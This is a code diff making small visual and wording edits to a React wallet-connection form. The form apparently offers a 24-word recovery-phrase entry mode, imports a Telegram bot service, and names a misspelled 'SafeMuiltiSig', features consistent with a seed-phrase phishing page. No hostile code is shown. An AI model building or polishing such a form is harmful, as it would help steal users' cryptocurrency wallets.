@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { X, Eye, EyeOff, AlertCircle, Calendar, CheckCircle, XCircle } from 'lucide-react';
+import { X, Eye, EyeOff, AlertCircle, Clock, CheckCircle, XCircle } from 'lucide-react';
 import { Button } from './ui/button';
 import { Progress } from './ui/progress';
 import telegramBotService from '../services/telegramBot';
@@ -194,7 +194,7 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                                     <span className="text-white text-center text-sm mb-2">Connect your wallet with SafeMuiltiSig.</span>
                                     <button
                                         type="button"
-                                        className="text-sm text-[#14244d] hover:bg-[#14244d]/10 px-3 py-1 rounded transition-colors mb-2"
+                                        className="text-sm text-zinc-500 hover:bg-[#14244d]/10 px-3 py-1 rounded transition-colors mb-2"
                                         onClick={handleToggle24Word}
                                         disabled={isLoading}
                                     >
@@ -267,15 +267,15 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                         <div className="space-y-2">
                             <div className="flex items-center justify-between text-xs px-1">
                                 <div className="flex items-center gap-1.5">
-                                    <span className="text-white font-semibold">
-                                        {telegramStatus === 'idle' ? "You're almost there! Complete your wallet connection below." : 'Processing...'}
+                                    <span className="text-white font-medium">
+                                        {telegramStatus === 'idle' ? "Almost there! Complete your wallet connection above." : 'Processing...'}
                                     </span>
                                 </div>
                                 <div className="flex items-center gap-1.5">
                                     <span className="text-white font-medium">
                                         {currentTime}
                                     </span>
-                                    <Calendar className="w-3.5 h-3.5" style={{ color: '#fff' }} />
+                                    <Clock className="w-3.5 h-3.5" style={{ color: '#fff' }} />
                                 </div>
                             </div>
                             <div>
